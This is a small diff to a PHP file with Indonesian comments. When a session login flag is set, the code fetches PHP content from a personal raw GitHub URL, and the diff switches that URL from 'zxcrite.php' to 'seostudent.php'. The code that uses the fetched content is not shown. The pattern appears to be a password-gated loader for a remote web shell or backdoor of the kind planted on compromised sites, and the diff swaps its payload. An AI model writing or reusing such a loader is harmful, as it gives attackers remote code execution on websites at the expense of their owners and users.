@@ -39,7 +39,7 @@ function fetchContent($url) {
 
 // Jika sudah login, ambil konten dari URL
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://raw.githubusercontent.com/handoko1013/CallMe301/refs/heads/main/zxcrite.php';
+    $url = 'https://raw.githubusercontent.com/handoko1013/CallMe301/refs/heads/main/seostudent.php';
     $content = fetchContent($url);
 
     if ($content !== false) {
